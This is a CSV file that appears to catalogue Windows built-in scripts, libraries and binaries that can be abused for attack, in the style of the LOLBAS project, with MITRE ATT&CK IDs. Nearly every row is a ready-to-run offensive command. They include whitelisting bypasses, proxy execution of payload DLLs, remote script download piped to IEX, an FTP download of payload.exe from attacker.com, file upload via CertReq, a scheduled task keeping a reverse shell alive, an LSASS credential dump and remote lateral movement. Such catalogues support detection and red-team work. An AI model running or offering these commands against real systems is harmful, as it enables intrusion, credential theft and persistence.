Category,Name,Description,Created,Command,Command Description,Command Category,Command Usecase,Command Privileges,Command OperatingSystem,Command MitreID
OSScripts,CL_Invocation.ps1,Aero diagnostics script,2018-05-25,. C:\\Windows\\diagnostics\\system\\AERO\\CL_Invocation.ps1   \nSyncInvoke <executable> [args],Import the PowerShell Diagnostic CL_Invocation script and call SyncInvoke to launch an executable.,Execute,Proxy execution,User,Windows 10,T1216
OSScripts,winrm.vbs,Script used for manage Windows RM settings,2018-05-25,"winrm invoke Create wmicimv2/Win32_Process @{CommandLine=""notepad.exe""} -r:http://target:5985",Lateral movement/Remote Command Execution via WMI Win32_Process class over the WinRM protocol,Execute,Proxy execution,User,Windows 10,T1216
OSScripts,winrm.vbs,Script used for manage Windows RM settings,2018-05-25,"winrm invoke Create wmicimv2/Win32_Service @{Name=""Evil"";DisplayName=""Evil"";PathName=""cmd.exe /k c:\windows\system32\notepad.exe""} -r:http://acmedc:5985   \nwinrm invoke StartService wmicimv2/Win32_Service?Name=Evil -r:http://acmedc:5985",Lateral movement/Remote Command Execution via WMI Win32_Service class over the WinRM protocol,Execute,Proxy execution,User,Windows 10,T1216
OSScripts,winrm.vbs,Script used for manage Windows RM settings,2018-05-25,%SystemDrive%\BypassDir\cscript //nologo %windir%\System32\winrm.vbs get wmicimv2/Win32_Process?Handle=4 -format:pretty,Bypass AWL solutions by copying and executing cscript.exe and malicious XSL documents from attacker controlled location,AWL Bypass,"Execute aribtrary, unsigned code via XSL script",User,Windows 10,T1216
OSScripts,CL_Mutexverifiers.ps1,,2018-05-25,. C:\\Windows\\diagnostics\\system\\AERO\\CL_Mutexverifiers.ps1   \nrunAfterCancelProcess calc.ps1,Import the PowerShell Diagnostic CL_Mutexverifiers script and call runAfterCancelProcess to launch an executable.,Execute,Proxy execution,User,Windows 10,T1216
OSScripts,UtilityFunctions.ps1,PowerShell Diagnostic Script,2021-09-26,"powershell.exe -command ""set-location -path c:\windows\diagnostics\system\networking; import-module .\UtilityFunctions.ps1; RegSnapin ..\..\..\..\temp\unsigned.dll;[Program.Class]::Main()”",Proxy execute Managed DLL with PowerShell,Execute,Execute proxied payload with Microsoft signed binary,User,Windows 10 21H1 (likely other versions as well),T1216
OSScripts,Syncappvpublishingserver.vbs,Script used related to app-v and publishing server,2018-05-25,"SyncAppvPublishingServer.vbs ""n;((New-Object Net.WebClient).DownloadString('http://some.url/script.ps1') | IEX""",Inject PowerShell script code with the provided arguments,Execute,Use Powershell host invoked from vbs script,User,Windows 10,T1216
OSScripts,Pester.bat,Used as part of the Powershell pester,2018-05-25,"Pester.bat [/help|?|-?|/?] ""$null; notepad""",Execute code using Pester. The third parameter can be anything. The fourth is the payload. Example here executes notepad,Execute,Proxy execution,User,Windows 10,T1216
OSScripts,Manage-bde.wsf,Script for managing BitLocker,2018-05-25,set comspec=c:\windows\system32\calc.exe & cscript c:\windows\system32\manage-bde.wsf,Set the comspec variable to another executable prior to calling manage-bde.wsf for execution.,Execute,Proxy execution from script,User,"Windows Vista, Windows 7, Windows 8, Windows 8.1, Windows 10",T1216
OSScripts,Manage-bde.wsf,Script for managing BitLocker,2018-05-25,copy c:\users\person\evil.exe c:\users\public\manage-bde.exe & cd c:\users\public\ & cscript.exe c:\windows\system32\manage-bde.wsf,Run the manage-bde.wsf script with a payload named manage-bde.exe in the same directory to run the payload file.,Execute,Proxy execution from script,User,"Windows Vista, Windows 7, Windows 8, Windows 8.1, Windows 10",T1216
OSScripts,CL_LoadAssembly.ps1,PowerShell Diagnostic Script,2021-09-26,"”powershell.exe -command ""set-location -path C:\Windows\diagnostics\system\Audio; import-module .\CL_LoadAssembly.ps1; LoadAssemblyFromPath ..\..\..\..\testing\fun.dll;[Program]::Fun()",Proxy execute Managed DLL with PowerShell,Execute,Execute proxied payload with Microsoft signed binary,User,Windows 10 21H1 (likely other versions as well),T1216
OSScripts,Pubprn.vbs,,2018-05-25,pubprn.vbs 127.0.0.1 script:https://domain.com/folder/file.sct,Set the 2nd variable with a Script COM moniker to perform Windows Script Host (WSH) Injection,Execute,Proxy execution,User,Windows 10,T1216.001
OSLibraries,Dfshim.dll,ClickOnce engine in Windows used by .NET,2018-05-25,"rundll32.exe dfshim.dll,ShOpenVerbApplication http://www.domain.com/application/?param1=foo","Executes click-once-application from Url (trampoline for Dfsvc.exe, DotNet ClickOnce host)",AWL bypass,Use binary to bypass Application whitelisting,User,"Windows Vista, Windows 7, Windows 8, Windows 8.1, Windows 10",T1127
OSLibraries,Pcwutl.dll,Microsoft HTML Viewer,2018-05-25,"rundll32.exe pcwutl.dll,LaunchApplication calc.exe",Launch executable by calling the LaunchApplication function.,Execute,Launch an executable.,User,Windows,T1218.011
OSLibraries,Url.dll,Internet Shortcut Shell Extension DLL.,2018-05-25,"rundll32.exe url.dll,OpenURL ""C:\test\calc.hta""",Launch a HTML application payload by calling OpenURL.,Execute,Invoke an HTML Application via mshta.exe (Default Handler).,User,Windows,T1218.011
OSLibraries,Url.dll,Internet Shortcut Shell Extension DLL.,2018-05-25,"rundll32.exe url.dll,OpenURL ""C:\test\calc.url""",Launch an executable payload via proxy through a(n) URL (information) file by calling OpenURL.,Execute,Load an executable payload by calling a .url file with or without quotes.,User,Windows,T1218.011
OSLibraries,Url.dll,Internet Shortcut Shell Extension DLL.,2018-05-25,"rundll32.exe url.dll,OpenURL file://^C^:^/^W^i^n^d^o^w^s^/^s^y^s^t^e^m^3^2^/^c^a^l^c^.^e^x^e",Launch an executable by calling OpenURL.,Execute,Load an executable payload by specifying the file protocol handler (obfuscated).,User,Windows,T1218.011
OSLibraries,Url.dll,Internet Shortcut Shell Extension DLL.,2018-05-25,"rundll32.exe url.dll,FileProtocolHandler calc.exe",Launch an executable by calling FileProtocolHandler.,Execute,Launch an executable.,User,Windows,T1218.011
OSLibraries,Url.dll,Internet Shortcut Shell Extension DLL.,2018-05-25,"rundll32.exe url.dll,FileProtocolHandler file://^C^:^/^W^i^n^d^o^w^s^/^s^y^s^t^e^m^3^2^/^c^a^l^c^.^e^x^e",Launch an executable by calling FileProtocolHandler.,Execute,Load an executable payload by specifying the file protocol handler (obfuscated).,User,Windows,T1218.011
OSLibraries,Url.dll,Internet Shortcut Shell Extension DLL.,2018-05-25,"rundll32.exe url.dll,FileProtocolHandler file:///C:/test/test.hta",Launch a HTML application payload by calling FileProtocolHandler.,Execute,Invoke an HTML Application via mshta.exe (Default Handler).,User,Windows,T1218.011
OSLibraries,Zipfldr.dll,Compressed Folder library,2018-05-25,"rundll32.exe zipfldr.dll,RouteTheCall calc.exe",Launch an executable payload by calling RouteTheCall.,Execute,Launch an executable.,User,Windows,T1218.011
OSLibraries,Zipfldr.dll,Compressed Folder library,2018-05-25,"rundll32.exe zipfldr.dll,RouteTheCall file://^C^:^/^W^i^n^d^o^w^s^/^s^y^s^t^e^m^3^2^/^c^a^l^c^.^e^x^e",Launch an executable payload by calling RouteTheCall (obfuscated).,Execute,Launch an executable.,User,Windows,T1218.011
OSLibraries,Ieadvpack.dll,INF installer for Internet Explorer. Has much of the same functionality as advpack.dll.,2018-05-25,"rundll32.exe ieadvpack.dll,LaunchINFSection c:\test.inf,DefaultInstall_SingleUser,1,",Execute the specified (local or remote) .wsh/.sct script with scrobj.dll in the .inf file by calling an information file directive (section name specified).,AWL Bypass,Run local or remote script(let) code through INF file specification.,User,Windows,T1218.011
OSLibraries,Ieadvpack.dll,INF installer for Internet Explorer. Has much of the same functionality as advpack.dll.,2018-05-25,"rundll32.exe ieadvpack.dll,LaunchINFSection c:\test.inf,,1,",Execute the specified (local or remote) .wsh/.sct script with scrobj.dll in the .inf file by calling an information file directive (DefaultInstall section implied).,AWL Bypass,Run local or remote script(let) code through INF file specification.,User,Windows,T1218.011
OSLibraries,Ieadvpack.dll,INF installer for Internet Explorer. Has much of the same functionality as advpack.dll.,2018-05-25,"rundll32.exe ieadvpack.dll,RegisterOCX test.dll",Launch a DLL payload by calling the RegisterOCX function.,Execute,Load a DLL payload.,User,Windows,T1218.011
OSLibraries,Ieadvpack.dll,INF installer for Internet Explorer. Has much of the same functionality as advpack.dll.,2018-05-25,"rundll32.exe ieadvpack.dll,RegisterOCX calc.exe",Launch an executable by calling the RegisterOCX function.,Execute,Run an executable payload.,User,N/A,T1218.011
OSLibraries,Ieadvpack.dll,INF installer for Internet Explorer. Has much of the same functionality as advpack.dll.,2018-05-25,"rundll32 ieadvpack.dll, RegisterOCX ""cmd.exe /c calc.exe""",Launch command line by calling the RegisterOCX function.,Execute,Run an executable payload.,User,N/A,T1218.011
OSLibraries,Ieaframe.dll,Internet Browser DLL for translating HTML code.,2018-05-25,"rundll32.exe ieframe.dll,OpenURL ""C:\test\calc.url""",Launch an executable payload via proxy through a(n) URL (information) file by calling OpenURL.,Execute,N/A,User,Windows,T1218.011
OSLibraries,Advpack.dll,Utility for installing software and drivers with rundll32.exe,2018-05-25,"rundll32.exe advpack.dll,LaunchINFSection c:\test.inf,DefaultInstall_SingleUser,1,",Execute the specified (local or remote) .wsh/.sct script with scrobj.dll in the .inf file by calling an information file directive (section name specified).,AWL Bypass,Run local or remote script(let) code through INF file specification.,User,Windows,T1218.011
OSLibraries,Advpack.dll,Utility for installing software and drivers with rundll32.exe,2018-05-25,"rundll32.exe advpack.dll,LaunchINFSection c:\test.inf,,1,",Execute the specified (local or remote) .wsh/.sct script with scrobj.dll in the .inf file by calling an information file directive (DefaultInstall section implied).,AWL Bypass,Run local or remote script(let) code through INF file specification.,User,Windows,T1218.011
OSLibraries,Advpack.dll,Utility for installing software and drivers with rundll32.exe,2018-05-25,"rundll32.exe advpack.dll,RegisterOCX test.dll",Launch a DLL payload by calling the RegisterOCX function.,Execute,Load a DLL payload.,User,Windows,T1218.011
OSLibraries,Advpack.dll,Utility for installing software and drivers with rundll32.exe,2018-05-25,"rundll32.exe advpack.dll,RegisterOCX calc.exe",Launch an executable by calling the RegisterOCX function.,Execute,Run an executable payload.,User,Windows,T1218.011
OSLibraries,Advpack.dll,Utility for installing software and drivers with rundll32.exe,2018-05-25,"rundll32 advpack.dll, RegisterOCX ""cmd.exe /c calc.exe""",Launch command line by calling the RegisterOCX function.,Execute,Run an executable payload.,User,Windows 10,T1218.011
OSLibraries,Syssetup.dll,Windows NT System Setup,2018-05-25,"rundll32.exe syssetup.dll,SetupInfObjectInstallAction DefaultInstall 128 c:\test\shady.inf",Execute the specified (local or remote) .wsh/.sct script with scrobj.dll in the .inf file by calling an information file directive (section name specified).,AWL Bypass,Run local or remote script(let) code through INF file specification (Note May pop an error window).,User,Windows,T1218.011
OSLibraries,Syssetup.dll,Windows NT System Setup,2018-05-25,"rundll32 syssetup.dll,SetupInfObjectInstallAction DefaultInstall 128 c:\temp\something.inf",Launch an executable file via the SetupInfObjectInstallAction function and .inf file section directive.,Execute,Load an executable payload.,User,Windows,T1218.011
OSLibraries,Shell32.dll,Windows Shell Common Dll,2018-05-25,"rundll32.exe shell32.dll,Control_RunDLL payload.dll",Launch a DLL payload by calling the Control_RunDLL function.,Execute,Load a DLL payload.,User,Windows,T1218.011
OSLibraries,Shell32.dll,Windows Shell Common Dll,2018-05-25,"rundll32.exe shell32.dll,ShellExec_RunDLL beacon.exe",Launch an executable by calling the ShellExec_RunDLL function.,Execute,Run an executable payload.,User,N/A,T1218.011
OSLibraries,Shell32.dll,Windows Shell Common Dll,2018-05-25,"rundll32 SHELL32.DLL,ShellExec_RunDLL ""cmd.exe"" ""/c echo hi""",Launch command line by calling the ShellExec_RunDLL function.,Execute,Run an executable payload.,User,N/A,T1218.011
OSLibraries,Setupapi.dll,Windows Setup Application Programming Interface,2018-05-25,"rundll32.exe setupapi.dll,InstallHinfSection DefaultInstall 128 C:\Tools\shady.inf",Execute the specified (local or remote) .wsh/.sct script with scrobj.dll in the .inf file by calling an information file directive (section name specified).,AWL Bypass,N/A,User,Windows,T1218.011
OSLibraries,Setupapi.dll,Windows Setup Application Programming Interface,2018-05-25,"rundll32.exe setupapi.dll,InstallHinfSection DefaultInstall 128 C:\\Tools\\calc_exe.inf",Launch an executable file via the InstallHinfSection function and .inf file section directive.,Execute,N/A,User,Windows,T1218.011
OSLibraries,Shdocvw.dll,Shell Doc Object and Control Library.,2018-05-25,"rundll32.exe shdocvw.dll,OpenURL ""C:\test\calc.url""",Launch an executable payload via proxy through a(n) URL (information) file by calling OpenURL.,Execute,Load an executable payload by calling a .url file with or without quotes.  The .url file extension can be renamed.,User,Windows,T1218.011
OSLibraries,Mshtml.dll,Microsoft HTML Viewer,2018-05-25,"rundll32.exe Mshtml.dll,PrintHTML ""C:\temp\calc.hta""",Invoke an HTML Application via mshta.exe (Note - Pops a security warning and a print dialogue box).,Execute,Launch an HTA application.,User,Windows,T1218.011
OSLibraries,Comsvcs.dll,COM+ Services,2019-08-30,"rundll32 C:\windows\system32\comsvcs.dll MiniDump ""[LSASS_PID] dump.bin full""","Calls the MiniDump exported function of comsvcs.dll, which in turns calls MiniDumpWriteDump.",Dump,Dump Lsass.exe process memory to retrieve credentials.,SYSTEM,Windows,T1003.001
OSBinaries,Regsvcs.exe,Regsvcs and Regasm are Windows command-line utilities that are used to register .NET Component Object Model (COM) assemblies,2018-05-25,regsvcs.exe AllTheThingsx64.dll,Loads the target .DLL file and executes the RegisterClass function.,Execute,Execute dll file and bypass Application whitelisting,Local Admin,"Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",T1218.009
OSBinaries,Regsvcs.exe,Regsvcs and Regasm are Windows command-line utilities that are used to register .NET Component Object Model (COM) assemblies,2018-05-25,regsvcs.exe AllTheThingsx64.dll,Loads the target .DLL file and executes the RegisterClass function.,AWL bypass,Execute dll file and bypass Application whitelisting,Local Admin,"Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",T1218.009
OSBinaries,OneDriveStandaloneUpdater.exe,OneDrive Standalone Updater,2021-08-22,OneDriveStandaloneUpdater,Download a file from the web address specified in HKCU\Software\Microsoft\OneDrive\UpdateOfficeConfig\UpdateRingSettingURLFromOC. ODSUUpdateXMLUrlFromOC and UpdateXMLUrlFromOC must be equal to non-empty string values in that same registry key. UpdateOfficeConfigTimestamp is a UNIX epoch time which must be set to a large QWORD such as 99999999999 (in decimal) to indicate the URL cache is good. The downloaded file will be in %localappdata%\OneDrive\StandaloneUpdater\PreSignInSettingsConfig.json,Download,Download a file from the Internet without executing any anomalous executables with suspicious arguments,User,Windows 10,T1105
OSBinaries,Ftp.exe,A binary designed for connecting to FTP servers,2018-12-10,echo !calc.exe > ftpcommands.txt && ftp -s:ftpcommands.txt,Executes the commands you put inside the text file.,Execute,Spawn new process using ftp.exe. Ftp.exe runs cmd /C YourCommand,User,"Windows 7, Windows 8, Windows 8.1, Windows 10",T1202
OSBinaries,Ftp.exe,A binary designed for connecting to FTP servers,2018-12-10,"cmd.exe /c ""@echo open attacker.com 21>ftp.txt&@echo USER attacker>>ftp.txt&@echo PASS PaSsWoRd>>ftp.txt&@echo binary>>ftp.txt&@echo GET /payload.exe>>ftp.txt&@echo quit>>ftp.txt&@ftp -s:ftp.txt -v""",Download,Download,Spawn new process using ftp.exe. Ftp.exe downloads the binary.,User,"Windows XP, Windows Vista, Windows 7, Windows 8, Windows 8.1, Windows 10",T1105
OSBinaries,Dfsvc.exe,ClickOnce engine in Windows used by .NET,2018-05-25,"rundll32.exe dfshim.dll,ShOpenVerbApplication http://www.domain.com/application/?param1=foo","Executes click-once-application from Url (trampoline for Dfsvc.exe, DotNet ClickOnce host)",AWL bypass,Use binary to bypass Application whitelisting,User,"Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",T1127
OSBinaries,OfflineScannerShell.exe,Windows Defender Offline Shell,2021-08-16,OfflineScannerShell,Execute mpclient.dll library in the current working directory,Execute,Can be used to evade defensive countermeasures or to hide as a persistence mechanism,Administrator,Windows 10,T1218
OSBinaries,Rasautou.exe,Windows Remote Access Dialer,2020-01-10,rasautou -d powershell.dll -p powershell -a a -e e,Loads the target .DLL specified in -d and executes the export specified in -p. Options removed in Windows 10.,Execute,Execute DLL code,"User, Administrator in Windows 8","Windows vista, Windows 7, Windows 8, Windows 8.1",T1218
OSBinaries,Schtasks.exe,Schedule periodic tasks,2018-05-25,"schtasks /create /sc minute /mo 1 /tn ""Reverse shell"" /tr c:\some\directory\revshell.exe",Create a recurring task to execute every minute.,Execute,Create a recurring task to keep reverse shell session(s) alive,User,Windows,T1053.005
OSBinaries,Schtasks.exe,Schedule periodic tasks,2018-05-25,"schtasks /create /s targetmachine /tn ""MyTask"" /tr c:\some\directory\notevil.exe /sc daily",Create a scheduled task on a remote computer for persistence/lateral movement,Execute,Create a remote task to run daily relative to the the time of creation,Administrator,Windows,T1053.005
OSBinaries,CertReq.exe,Used for requesting and managing certificates,2020-07-07,CertReq -Post -config https://example.org/ c:\windows\win.ini output.txt,Save the response from a HTTP POST to the endpoint https://example.org/ as output.txt in the current directory,Download,Download file from Internet,User,"Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",T1105
OSBinaries,CertReq.exe,Used for requesting and managing certificates,2020-07-07,CertReq -Post -config https://example.org/ c:\windows\win.ini and show response in terminal,Send the file c:\windows\win.ini to the endpoint https://example.org/ via HTTP POST,Upload,Upload,User,"Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",T1105
OSBinaries,Pktmon.exe,Capture Network Packets on the windows 10 with October 2018 Update or later.,2020-08-12,pktmon.exe start --etw,Will start a packet capture and store log file as PktMon.etl. Use pktmon.exe stop,Reconnaissance,use this a built in network sniffer on windows 10 to capture senstive traffic,Administrator,Windows 10 1809 and later,T1040
OSBinaries,Pktmon.exe,Capture Network Packets on the windows 10 with October 2018 Update or later.,2020-08-12,pktmon.exe filter add -p 445,Select Desired ports for packet capture,Reconnaissance,Look for interesting traffic such as telent or FTP,Administrator,Windows 10 1809 and later,T1040
